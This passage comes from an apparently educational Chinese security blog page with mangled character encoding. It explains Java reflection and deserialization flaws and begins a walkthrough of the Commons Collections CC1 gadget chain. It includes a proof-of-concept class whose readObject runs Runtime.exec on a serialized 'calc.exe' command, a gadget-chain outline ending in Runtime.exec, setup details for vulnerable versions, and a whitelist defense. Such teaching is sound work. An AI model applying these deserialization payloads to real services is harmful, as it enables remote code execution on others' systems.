è§£æç±»ç»“æ„ï¼ˆæ–¹æ³•è¡¨ã€å­—æ®µè¡¨ç­‰ï¼‰ã€‚</li><li><strong>åå°„è°ƒç”¨æ€§èƒ½è¾ƒä½</strong>ï¼š<br>  å› éœ€<strong>åŠ¨æ€è§£æç±»å‹</strong> + <strong>å®‰å…¨æ£€æŸ¥</strong>ï¼ˆå¦‚<code>setAccessible</code>è·³è¿‡æ£€æŸ¥å¯æå‡æ€§èƒ½ï¼‰ã€‚</li></ul><hr><h3 id="ä¸‰ã€åå°„çš„åº”ç”¨åœºæ™¯ä¸æ³¨æ„äº‹é¡¹"><a href="#ä¸‰ã€åå°„çš„åº”ç”¨åœºæ™¯ä¸æ³¨æ„äº‹é¡¹" class="headerlink" title="ä¸‰ã€åå°„çš„åº”ç”¨åœºæ™¯ä¸æ³¨æ„äº‹é¡¹"></a>ä¸‰ã€åå°„çš„åº”ç”¨åœºæ™¯ä¸æ³¨æ„äº‹é¡¹</h3><h4 id="1-å…¸å‹åº”ç”¨åœºæ™¯"><a href="#1-å…¸å‹åº”ç”¨åœºæ™¯" class="headerlink" title="1. å…¸å‹åº”ç”¨åœºæ™¯"></a>1. <strong>å…¸å‹åº”ç”¨åœºæ™¯</strong></h4><table><thead><tr><th><strong>åœºæ™¯</strong></th><th><strong>ä»£è¡¨æ¡†æ¶</strong></th><th><strong>åå°„çš„ä½œç”¨</strong></th></tr></thead><tbody><tr><td><strong>åŠ¨æ€ä»£ç†</strong></td><td>Spring AOP</td><td>ç”Ÿæˆä»£ç†ç±»ï¼Œæ‹¦æˆªæ–¹æ³•è°ƒç”¨</td></tr><tr><td><strong>ä¾èµ–æ³¨å…¥</strong></td><td>Spring IOC</td><td>æ ¹æ®é…ç½®åˆ›å»ºå¹¶æ³¨å…¥Beanå¯¹è±¡</td></tr><tr><td><strong>æ³¨è§£è§£æ</strong></td><td>JUnit</td><td>æ‰«æ<code>@Test</code>æ³¨è§£çš„æ–¹æ³•å¹¶æ‰§è¡Œæµ‹è¯•</td></tr><tr><td><strong>åºåˆ—åŒ–&#x2F;ååºåˆ—åŒ–</strong></td><td>Jackson&#x2F;Gson</td><td>å°†JSONå­—æ®µæ˜ å°„åˆ°å¯¹è±¡çš„ç§æœ‰å±æ€§</td></tr></tbody></table><h4 id="2-åå°„çš„â€œå®‰å…¨å¢™â€"><a href="#2-åå°„çš„â€œå®‰å…¨å¢™â€" class="headerlink" title="2. åå°„çš„â€œå®‰å…¨å¢™â€"></a>2. <strong>åå°„çš„â€œå®‰å…¨å¢™â€</strong></h4><ul><li><strong>æƒé™æ§åˆ¶</strong>ï¼š<br>  é»˜è®¤æ— æ³•è®¿é—®ç§æœ‰æˆå‘˜ï¼Œéœ€æ˜¾å¼è°ƒç”¨<code>setAccessible(true)</code>ï¼ˆå¯èƒ½è§¦å‘å®‰å…¨ç®¡ç†å™¨æ‹¦æˆªï¼‰ã€‚</li><li><strong>æ›¿ä»£æ–¹æ¡ˆ</strong>ï¼š<br>  ä¼˜å…ˆä½¿ç”¨æ¥å£ã€è®¾è®¡æ¨¡å¼ï¼ˆå¦‚å·¥å‚æ¨¡å¼ï¼‰ï¼Œé¿å…è¿‡åº¦ä¾èµ–åå°„ã€‚</li></ul><h4 id="3-æ€§èƒ½ä¼˜åŒ–å»ºè®®"><a href="#3-æ€§èƒ½ä¼˜åŒ–å»ºè®®" class="headerlink" title="3. æ€§èƒ½ä¼˜åŒ–å»ºè®®"></a>3. <strong>æ€§èƒ½ä¼˜åŒ–å»ºè®®</strong></h4><ul><li><strong>ç¼“å­˜<code>Class</code>å¯¹è±¡</strong>ï¼šé¿å…é‡å¤è°ƒç”¨<code>Class.forName()</code>ã€‚</li><li><strong>å‡å°‘<code>setAccessible(true)</code>è°ƒç”¨</strong>ï¼šæ¯æ¬¡è°ƒç”¨éƒ½æœ‰å®‰å…¨æ£€æŸ¥å¼€é”€ã€‚</li><li><strong>ä¼˜å…ˆç”¨æ¥å£è°ƒç”¨</strong>ï¼šå¦‚<code>obj.method()</code>æ¯”<code>method.invoke(obj)</code>å¿«10å€ä»¥ä¸Šã€‚</li></ul><hr><h3 id="å››ã€æ€»ç»“ï¼š"><a href="#å››ã€æ€»ç»“ï¼š" class="headerlink" title="å››ã€æ€»ç»“ï¼š"></a>å››ã€æ€»ç»“ï¼š</h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">graph <span class="selector-tag">TD</span></span><br><span class="line">    <span class="selector-tag">A</span><span class="selector-attr">[åå°„æ ¸å¿ƒï¼šClasså¯¹è±¡]</span> --&gt; <span class="selector-tag">B</span><span class="selector-attr">[åˆ›å»ºå¯¹è±¡]</span></span><br><span class="line">    <span class="selector-tag">A</span> --&gt; C<span class="selector-attr">[è°ƒç”¨æ–¹æ³•]</span></span><br><span class="line">    <span class="selector-tag">A</span> --&gt; D<span class="selector-attr">[è®¿é—®å­—æ®µ]</span></span><br><span class="line">    <span class="selector-tag">B</span> --&gt; E<span class="selector-attr">[Constructor.newInstance()]</span></span><br><span class="line">    C --&gt; F<span class="selector-attr">[Method.invoke()]</span></span><br><span class="line">    D --&gt; <span class="selector-tag">G</span><span class="selector-attr">[Field.get()/set()]</span></span><br><span class="line">    E --&gt; H<span class="selector-attr">[åŠ¨æ€ä»£ç†/IOC]</span></span><br><span class="line">    F --&gt; <span class="selector-tag">I</span><span class="selector-attr">[æ¡†æ¶æ–¹æ³•æ‹¦æˆª]</span></span><br><span class="line">    <span class="selector-tag">G</span> --&gt; J<span class="selector-attr">[åºåˆ—åŒ–/é…ç½®æ³¨å…¥]</span></span><br><span class="line">    H --&gt; K<span class="selector-attr">[Spring]</span></span><br><span class="line">    <span class="selector-tag">I</span> --&gt; K</span><br><span class="line">    J --&gt; K</span><br></pre></td></tr></table></figure><p><strong>åå°„çš„æœ¬è´¨</strong>ï¼š<strong>è¿è¡Œæ—¶æ“ä½œç±»å…ƒä¿¡æ¯çš„èƒ½åŠ›</strong>ï¼Œæ˜¯æ¡†æ¶çµæ´»æ€§çš„æ ¹åŸºï¼Œä½†éœ€æƒè¡¡<strong>çµæ´»æ€§</strong>ã€<strong>å®‰å…¨æ€§</strong>ä¸<strong>æ€§èƒ½</strong>ã€‚</p><h2 id="javaåºåˆ—åŒ–åŸºç¡€"><a href="#javaåºåˆ—åŒ–åŸºç¡€" class="headerlink" title="javaåºåˆ—åŒ–åŸºç¡€"></a>javaåºåˆ—åŒ–åŸºç¡€</h2><h3 id="ä¸€ã€å…ˆçœ‹ä¸€ä¸ªæ¼æ´è§¦å‘æ¡ˆä¾‹"><a href="#ä¸€ã€å…ˆçœ‹ä¸€ä¸ªæ¼æ´è§¦å‘æ¡ˆä¾‹" class="headerlink" title="ä¸€ã€å…ˆçœ‹ä¸€ä¸ªæ¼æ´è§¦å‘æ¡ˆä¾‹"></a><strong>ä¸€ã€å…ˆçœ‹ä¸€ä¸ªæ¼æ´è§¦å‘æ¡ˆä¾‹</strong></h3><p>å®Œæ•´ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// æ¼æ´ç±»ï¼šé‡å†™äº†readObject()</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VulnerableObject</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String command;</span><br><span class="line">    <span class="comment">// æ„é€ æ–¹æ³•ç•¥...</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        in.defaultReadObject(); <span class="comment">// é»˜è®¤ååºåˆ—åŒ–</span></span><br><span class="line">        Runtime.getRuntime().exec(<span class="built_in">this</span>.command); <span class="comment">// å±é™©æ“ä½œï¼</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ”»å‡»è€…æ„é€ æ¶æ„æ•°æ®</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Attack</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 1. åˆ›å»ºæ¶æ„å¯¹è±¡ï¼ˆå‘½ä»¤æ³¨å…¥ï¼‰</span></span><br><span class="line">        <span class="type">VulnerableObject</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VulnerableObject</span>(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 2. åºåˆ—åŒ–å¯¹è±¡ -&gt; å­—èŠ‚æµ</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bos);</span><br><span class="line">        oos.writeObject(payload);</span><br><span class="line">        <span class="type">byte</span>[] maliciousData = bos.toByteArray();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 3. å—å®³è€…ååºåˆ—åŒ– -&gt; è§¦å‘å‘½ä»¤æ‰§è¡Œ</span></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(maliciousData);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bis);</span><br><span class="line">        ois.readObject(); <span class="comment">// æ­¤å¤„å¼¹å‡ºè®¡ç®—å™¨ï¼</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ†æ</p><figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VulnerableObject</span> implements Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> command;</span><br><span class="line">    <span class="comment">// æ„é€ æ–¹æ³•ï¼šè®¾ç½®è¦æ‰§è¡Œçš„å‘½ä»¤</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">VulnerableObject</span><span class="params">(<span class="type">String</span> command)</span> </span>&#123; <span class="keyword">this</span>.command = command; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ååºåˆ—åŒ–æ—¶è‡ªåŠ¨è§¦å‘</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="type">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream in)</span> throws IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        in.<span class="built_in">defaultReadObject</span>(); <span class="comment">// é»˜è®¤ååºåˆ—åŒ–</span></span><br><span class="line">        Runtime.<span class="built_in">getRuntime</span>().<span class="built_in">exec</span>(<span class="keyword">this</span>.command); <span class="comment">// ç‚¸å¼¹å¼•çˆ†ç‚¹ğŸ’£</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ”»å‡»æµç¨‹</strong>ï¼š</p><ol><li><p><strong>æ„é€ æ¶æ„å¯¹è±¡</strong>ï¼š<code>VulnerableObject payload = new VulnerableObject(&quot;calc.exe&quot;);</code><br> â†’ ç›¸å½“äºåˆ¶ä½œä¸€ä¸ªè—äº†åˆ€çš„ç›’å­</p></li><li><p><strong>åºåˆ—åŒ–æˆå­—èŠ‚æµ</strong>ï¼š</p> <figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">ByteArrayOutputStream bos <span class="operator">=</span> new ByteArrayOutputStream()<span class="comment">;</span></span><br><span class="line">ObjectOutputStream oos <span class="operator">=</span> new ObjectOutputStream(bos)<span class="comment">;</span></span><br><span class="line">oos.writeObject(payload)<span class="comment">; // æŠŠåˆ€ç›’å°è£…æˆå¿«é€’</span></span><br><span class="line">byte[] maliciousData <span class="operator">=</span> bos.toByteArray()<span class="comment">; // åŒ…è£¹</span></span><br></pre></td></tr></table></figure></li><li><p><strong>è§¦å‘æ¼æ´</strong>ï¼š</p> <figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">ByteArrayInputStream bis <span class="operator">=</span> new ByteArrayInputStream(maliciousData)<span class="comment">;</span></span><br><span class="line">ObjectInputStream ois <span class="operator">=</span> new ObjectInputStream(bis)<span class="comment">;</span></span><br><span class="line">ois.readObject()<span class="comment">; // æ‹†å¿«é€’ç›’ â†’ åˆ€ï¼ˆå¼¹å‡ºè®¡ç®—å™¨ï¼‰</span></span><br></pre></td></tr></table></figure></li></ol><p><strong>å…³é”®ç‚¹</strong>ï¼š</p><ul><li><strong>æ¼æ´æœ¬è´¨</strong>ï¼šååºåˆ—åŒ–æ˜¯â€œè‡ªåŠ¨æ‹†ç®±â€è¿‡ç¨‹ï¼Œ<code>readObject()</code>æ˜¯æ‹†ç®±å·¥å…· â†’ å¦‚æœæ‹†ç®±è§„åˆ™è¢«ç¯¡æ”¹ï¼ˆé‡å†™æ–¹æ³•ï¼‰ï¼Œæ‹†ç®±æ—¶å°±ä¼šæ‰§è¡Œæ¶æ„æ“ä½œ</li><li><strong>å…³é”®è¯å®šä½</strong>ï¼š<br>  <code>implements Serializable</code> + <code>private void readObject()</code> â†’ ç«‹åˆ»è­¦æƒ•æ˜¯å¦åŒ…å«å±é™©ä»£ç ï¼ˆå¦‚<code>Runtime.exec()</code>ï¼‰</li></ul><p>ä»ä¸­æˆ‘ä»¬èƒ½æå–å“ªäº›å…³é”®æ¦‚å¿µï¼Ÿ</p><hr><h3 id="äºŒã€ä»ç­”æ¡ˆåæ¨æ ¸å¿ƒæ¦‚å¿µ"><a href="#äºŒã€ä»ç­”æ¡ˆåæ¨æ ¸å¿ƒæ¦‚å¿µ" class="headerlink" title="äºŒã€ä»ç­”æ¡ˆåæ¨æ ¸å¿ƒæ¦‚å¿µ"></a><strong>äºŒã€ä»ç­”æ¡ˆåæ¨æ ¸å¿ƒæ¦‚å¿µ</strong></h3><h4 id="1-åŸºç¡€ç‚¹"><a href="#1-åŸºç¡€ç‚¹" class="headerlink" title="**1. åŸºç¡€ç‚¹"></a>**1. åŸºç¡€ç‚¹</h4><ul><li><strong>åºåˆ—åŒ–</strong>ï¼šå¯¹è±¡ â†’ å­—èŠ‚æµï¼ˆ<code>ObjectOutputStream.writeObject()</code>ï¼‰</li><li><strong>ååºåˆ—åŒ–</strong>ï¼šå­—èŠ‚æµ â†’ å¯¹è±¡ï¼ˆ<code>ObjectInputStream.readObject()</code>ï¼‰</li><li><strong>å¯åºåˆ—åŒ–çš„æ¡ä»¶</strong>ï¼šç±»å¿…é¡»å®ç° <code>Serializable</code> æ¥å£ï¼ˆæ ‡è®°æ¥å£ï¼Œæ— æ–¹æ³•ï¼‰</li></ul><blockquote><p> <strong>ç±»æ¯”æ•°å­¦å…¬å¼</strong>ï¼š<br><code>åºåˆ—åŒ– = writeObject()</code>ï¼Œ<code>ååºåˆ—åŒ– = readObject()</code>ï¼Œ<code>Serializable</code> æ˜¯â€œè®¸å¯è¯â€ã€‚</p></blockquote><h4 id="2-ç›¸å…³çŸ¥è¯†"><a href="#2-ç›¸å…³çŸ¥è¯†" class="headerlink" title="2. ç›¸å…³çŸ¥è¯†"></a><strong>2. ç›¸å…³çŸ¥è¯†</strong></h4><ul><li><strong><code>readObject()</code> æ˜¯â€œè‡ªåŠ¨è§¦å‘å™¨â€</strong>ï¼šååºåˆ—åŒ–æ—¶JVMè‡ªåŠ¨è°ƒç”¨è¯¥æ–¹æ³•ï¼Œ<strong>é‡å†™å®ƒå¯èƒ½å¼•å…¥æ¼æ´</strong>ï¼ˆå¦‚ä¸Šä¾‹çš„ <code>Runtime.exec()</code>ï¼‰</li><li><strong><code>transient</code> å­—æ®µä¸åºåˆ—åŒ–</strong>ï¼šæ¯”å¦‚å¯†ç å­—æ®µåº”åŠ  <code>transient</code> é¿å…æ³„éœ²</li><li><strong><code>serialVersionUID</code> æ˜¯ç‰ˆæœ¬å·</strong>ï¼šæ˜¾å¼å£°æ˜å¯é¿å…ç±»ç»“æ„å˜æ›´å¯¼è‡´çš„å…¼å®¹é—®é¢˜</li></ul><blockquote><p> <strong>è§£é¢˜å…³é”®è¯</strong>ï¼š<br>çœ‹åˆ° <code>readObject()</code> â†’ è­¦æƒ•æ˜¯å¦é‡å†™ â†’ æ£€æŸ¥å†…éƒ¨é€»è¾‘æ˜¯å¦æœ‰å±é™©æ“ä½œï¼ˆå¦‚æ‰§è¡Œå‘½ä»¤ã€åå°„è°ƒç”¨ï¼‰ã€‚</p></blockquote><hr><h3 id="ä¸‰ã€è§£é¢˜æ€è·¯ï¼šä¸ºä»€ä¹ˆæ¼æ´èƒ½åˆ©ç”¨ï¼Ÿ"><a href="#ä¸‰ã€è§£é¢˜æ€è·¯ï¼šä¸ºä»€ä¹ˆæ¼æ´èƒ½åˆ©ç”¨ï¼Ÿ" class="headerlink" title="ä¸‰ã€è§£é¢˜æ€è·¯ï¼šä¸ºä»€ä¹ˆæ¼æ´èƒ½åˆ©ç”¨ï¼Ÿ"></a><strong>ä¸‰ã€è§£é¢˜æ€è·¯ï¼šä¸ºä»€ä¹ˆæ¼æ´èƒ½åˆ©ç”¨ï¼Ÿ</strong></h3><h4 id="æ­¥éª¤æ‹†è§£"><a href="#æ­¥éª¤æ‹†è§£" class="headerlink" title="æ­¥éª¤æ‹†è§£"></a><strong>æ­¥éª¤æ‹†è§£</strong></h4><ol><li><strong>ç›®æ ‡å®šä½</strong>ï¼šæ‰¾åˆ°é‡å†™ <code>readObject()</code> çš„ç±»ï¼ˆå¦‚ <code>VulnerableObject</code>ï¼‰<br> â†’ <strong>å…³é”®è¯</strong>ï¼šç±»å®ç° <code>Serializable</code> + è‡ªå®šä¹‰ <code>readObject</code> æ–¹æ³•</li><li><strong>æ„é€ æ¶æ„è¾“å…¥</strong>ï¼šè®¾ç½®å±é™©å‚æ•°ï¼ˆå¦‚ <code>command = &quot;calc.exe&quot;</code>ï¼‰</li><li><strong>åºåˆ—åŒ–ä¼ é€’</strong>ï¼šå°†å¯¹è±¡è½¬ä¸ºå­—èŠ‚æµï¼ˆæ”»å‡»è½½è·ï¼‰</li><li><strong>è§¦å‘æ¼æ´</strong>ï¼šå—å®³è€…ååºåˆ—åŒ–æ—¶è‡ªåŠ¨æ‰§è¡Œ <code>readObject()</code> ä¸­çš„æ¶æ„ä»£ç </li></ol><blockquote><p> <strong>æ¼æ´æœ¬è´¨</strong>ï¼š<br>ååºåˆ—åŒ–æ˜¯<strong>â€œç›²ç›’æ‹†ç®±â€è¿‡ç¨‹</strong>ã€‚å¦‚æœç®±å­ï¼ˆç±»ï¼‰çš„æ‹†ç®±è§„åˆ™ï¼ˆ<code>readObject</code>ï¼‰è¢«åŠ¨äº†æ‰‹è„šï¼Œæ‹†ç®±æ—¶å°±å¯èƒ½çˆ†ç‚¸ï¼ˆæ‰§è¡Œæ¶æ„ä»£ç ï¼‰ã€‚</p></blockquote><hr><h3 id="å››ã€æ¼æ´åˆ©ç”¨é“¾çš„è§£é¢˜é€»è¾‘"><a href="#å››ã€æ¼æ´åˆ©ç”¨é“¾çš„è§£é¢˜é€»è¾‘" class="headerlink" title="å››ã€æ¼æ´åˆ©ç”¨é“¾çš„è§£é¢˜é€»è¾‘"></a><strong>å››ã€æ¼æ´åˆ©ç”¨é“¾çš„è§£é¢˜é€»è¾‘</strong></h3><p>å®é™…æ¼æ´å¾ˆå°‘åƒä¸Šé¢é‚£ä¹ˆç®€å•ï¼Œè€Œæ˜¯åƒ<strong>å¤šç±³è¯ºéª¨ç‰Œ</strong>ä¸€æ ·ä¸²è”è°ƒç”¨ï¼ˆç§°ä¸ºGadget Chainï¼‰ã€‚ä¾‹å¦‚ï¼š</p><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">readObject</span><span class="params">()</span></span> â†’ è°ƒç”¨Aç±»æ–¹æ³• â†’ è°ƒç”¨Bç±»æ–¹æ³• â†’...â†’ æ‰§è¡ŒRuntime<span class="selector-class">.exec</span>()</span><br></pre></td></tr></table></figure><figure class="highlight xl"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">readObject</span>-&gt;</span>&gt;TransformedMap: éå†Mapè§¦å‘setValue()</span><br><span class="line">T<span class="function"><span class="title">ransformedMap</span>-&gt;</span>&gt;ChainedTransformer: è°ƒç”¨transform()</span><br><span class="line">C<span class="function"><span class="title">hainedTransformer</span>-&gt;</span>&gt;InvokerTransformer1: æ‰§è¡ŒConstantTransformer</span><br><span class="line">I<span class="function"><span class="title">nvokerTransformer1</span>-&gt;</span>&gt;InvokerTransformer2: åå°„getMethod()</span><br><span class="line">I<span class="function"><span class="title">nvokerTransformer2</span>-&gt;</span>&gt;InvokerTransformer3: åå°„invoke()</span><br><span class="line">I<span class="function"><span class="title">nvokerTransformer3</span>-&gt;</span>&gt;Runtime.exec(): å¼¹è®¡ç®—å™¨ï¼</span><br></pre></td></tr></table></figure><p><strong>è§£é¢˜æ–¹æ³•</strong>ï¼š</p><ol><li><strong>èµ·ç‚¹</strong>ï¼šæ‰¾åˆ°ä¸€ä¸ªå¯è§¦å‘ååºåˆ—åŒ–çš„å…¥å£ï¼ˆå¦‚ç½‘ç»œæ¥å£æ¥æ”¶æ•°æ®æµï¼‰</li><li><strong>ä¸­é—´è·³æ¿</strong>ï¼šåˆ©ç”¨JDKæˆ–ç¬¬ä¸‰æ–¹åº“ï¼ˆå¦‚Apache Commons Collectionsï¼‰ä¸­çš„å±é™©ç±»ï¼š<ul><li>ä¾‹å¦‚ <code>InvokerTransformer.transform()</code> å¯é€šè¿‡åå°„æ‰§è¡Œä»»æ„æ–¹æ³•</li></ul></li><li><strong>ç»ˆç‚¹</strong>ï¼šè¿æ¥åˆ°æœ€ç»ˆæ‰§è¡Œç‚¹ï¼ˆå¦‚å‘½ä»¤æ‰§è¡Œã€æ–‡ä»¶è¯»å†™ï¼‰</li></ol><blockquote><p> <strong>å…³é”®è¯å®šä½é“¾</strong>ï¼š</p><ul><li>æœç´¢ <code>readObject()</code> ä¸­è°ƒç”¨çš„å…¶ä»–ç±»æ–¹æ³•</li><li>æ£€æŸ¥è¿™äº›æ–¹æ³•æ˜¯å¦è°ƒç”¨å±é™©å‡½æ•°ï¼ˆå¦‚åå°„ã€JNDIã€æ–‡ä»¶æ“ä½œï¼‰</li></ul></blockquote><hr><h3 id="äº”ã€é˜²å¾¡æªæ–½"><a href="#äº”ã€é˜²å¾¡æªæ–½" class="headerlink" title="äº”ã€é˜²å¾¡æªæ–½"></a><strong>äº”ã€é˜²å¾¡æªæ–½</strong></h3><ol><li><strong>é¿å…ååºåˆ—åŒ–ä¸å¯ä¿¡æ•°æ®</strong>ï¼šåƒåšæ•°å­¦é¢˜éªŒç®—ä¸€æ ·ï¼Œæ°¸è¿œæ ¡éªŒæ•°æ®å¯¹æ²¡</li><li><strong>æ›¿æ¢åŸç”Ÿåºåˆ—åŒ–</strong>ï¼šç”¨JSON&#x2F;XMLç­‰æ›´å®‰å…¨çš„æ ¼å¼ï¼ˆå¦‚Jacksonã€Gsonï¼‰</li><li><strong>ç™½åå•æ§åˆ¶</strong>ï¼šé™åˆ¶å¯ååºåˆ—åŒ–çš„ç±»ï¼ˆå¦‚ <code>ObjectInputStream</code> çš„ <code>accept</code> åˆ—è¡¨ï¼‰</li><li><strong>åŠ å›ºå…³é”®ç±»</strong>ï¼šå¯¹æ•æ„Ÿç±»ï¼ˆå¦‚ <code>ObjectInputStream</code>ï¼‰é‡å†™ <code>resolveClass()</code> åšæ ¡éªŒ</li></ol><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="comment">// é˜²å¾¡ç¤ºä¾‹ï¼šè‡ªå®šä¹‰ObjectInputStreamæ·»åŠ ç™½åå•</span></span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">SafeObjectInputStream</span> <span class="keyword">extends</span> <span class="title">ObjectInputStream</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="type">Class</span>&lt;?&gt; resolveClass(<span class="type">ObjectStreamClass</span> desc) <span class="keyword">throws</span> <span class="type">IOException</span>, <span class="type">ClassNotFoundException</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!desc.getName().equals(<span class="string">&quot;com.safe.MyClass&quot;</span>)) &#123; <span class="comment">// åªå…è®¸ååºåˆ—åŒ–æŒ‡å®šç±»</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="type">InvalidClassException</span>(<span class="string">&quot;Unauthorized class: &quot;</span>, desc.getName());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.resolveClass(desc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a><strong>æ€»ç»“</strong></h3><p>Javaååºåˆ—åŒ–æ¼æ´çš„æœ¬è´¨æ˜¯ï¼š<br><strong>æ§åˆ¶è¾“å…¥æµ â†’ è§¦å‘å±é™© <code>readObject()</code> â†’ ä¸²è”è°ƒç”¨é“¾ï¼ˆGadgetï¼‰â†’ è¾¾åˆ°æ”»å‡»æ•ˆæœ</strong>  </p><h2 id="javaCC1é“¾"><a href="#javaCC1é“¾" class="headerlink" title="javaCC1é“¾"></a>javaCC1é“¾</h2><h3 id="ä¸€ã€ç¯å¢ƒå‡†å¤‡ä¸æ¼æ´èƒŒæ™¯"><a href="#ä¸€ã€ç¯å¢ƒå‡†å¤‡ä¸æ¼æ´èƒŒæ™¯" class="headerlink" title="ä¸€ã€ç¯å¢ƒå‡†å¤‡ä¸æ¼æ´èƒŒæ™¯"></a><strong>ä¸€ã€ç¯å¢ƒå‡†å¤‡ä¸æ¼æ´èƒŒæ™¯</strong></h3><h4 id="1-å¤ç°ç¯å¢ƒ"><a href="#1-å¤ç°ç¯å¢ƒ" class="headerlink" title="1. å¤ç°ç¯å¢ƒ"></a>1. <strong>å¤ç°ç¯å¢ƒ</strong></h4><ul><li><p><strong>JDKç‰ˆæœ¬</strong>ï¼šâ‰¤8u65ï¼ˆé«˜ç‰ˆæœ¬ä¿®å¤<code>AnnotationInvocationHandler</code>çš„ååºåˆ—åŒ–é€»è¾‘ï¼‰<br>ä¸‹è½½ï¼š<a href="https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html">https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html</a> ï¼›<br>ï¼ˆå‹æƒ…æç¤ºï¼šå¦‚æœä¸‹è½½å‡ºæ¥æ˜¯jdk8u111ï¼ŒæŠŠ&#x2F;cnåˆ å»ï¼‰</p></li><li><p><strong>ä¾èµ–åº“</strong>ï¼šCommons Collections 3.2.1</p>  <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="2-æ¼æ´æ ¸å¿ƒé€»è¾‘"><a href="#2-æ¼æ´æ ¸å¿ƒé€»è¾‘" class="headerlink" title="2. æ¼æ´æ ¸å¿ƒé€»è¾‘"></a>2. <strong>æ¼æ´æ ¸å¿ƒé€»è¾‘</strong></h4><ul><li><strong>å…ˆæ‰¾åˆ°èµ·ç‚¹</strong>ï¼šååºåˆ—åŒ–å…¥å£<code>AnnotationInvocationHandler.readObject()</code></li><li><strong>ç¡®å®šç»ˆç‚¹</strong>ï¼š<code>InvokerTransformer.transform()</code>é€šè¿‡åå°„æ‰§è¡Œä»»æ„å‘½ä»¤ï¼ˆå¦‚<code>Runtime.exec(&quot;calc&quot;)</code>ï¼‰</li><li><strong>ç›®æ ‡</strong>ï¼šæ„é€ ä¸€æ¡ä»<code>readObject()</code>åˆ°<code>transform()</code>çš„è°ƒç”¨é“¾ï¼Œè§¦å‘RCEã€‚</li></ul><hr><h3 id="äºŒã€åˆ†æ­¥æ‹†è§£ï¼šCC1é“¾çš„æ„é€ "><a href="#äºŒã€åˆ†æ­¥æ‹†è§£ï¼šCC1é“¾çš„æ„é€ " class="headerlink" title="äºŒã€åˆ†æ­¥æ‹†è§£ï¼šCC1é“¾çš„æ„é€ "></a><strong>äºŒã€åˆ†æ­¥æ‹†è§£ï¼šCC1é“¾çš„æ„é€ </strong></h3><h4 id="æ­¥éª¤1ï¼šç»ˆç‚¹-InvokerTransformer"><a href="#æ­¥éª¤1ï¼šç»ˆç‚¹-InvokerTransformer" class="headerlink" title="æ­¥éª¤1ï¼šç»ˆç‚¹ - InvokerTransformer"></a><strong>æ­¥éª¤1ï¼šç»ˆç‚¹ - 